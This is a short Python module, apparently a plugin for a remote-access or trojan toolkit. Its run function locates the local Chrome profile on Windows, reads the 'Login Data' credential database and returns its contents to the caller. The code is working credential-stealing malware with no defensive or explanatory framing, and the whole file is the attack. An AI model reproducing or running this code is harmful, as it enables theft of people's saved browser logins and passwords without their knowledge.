import os
import codecs



def run(**args):

	path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Default')

	if os.path.exists(path):

		with codecs.open(path + r'\Login Data', 'r', encoding="utf8", errors = 'ignore') as f:

			return f.read()

	return ('None')
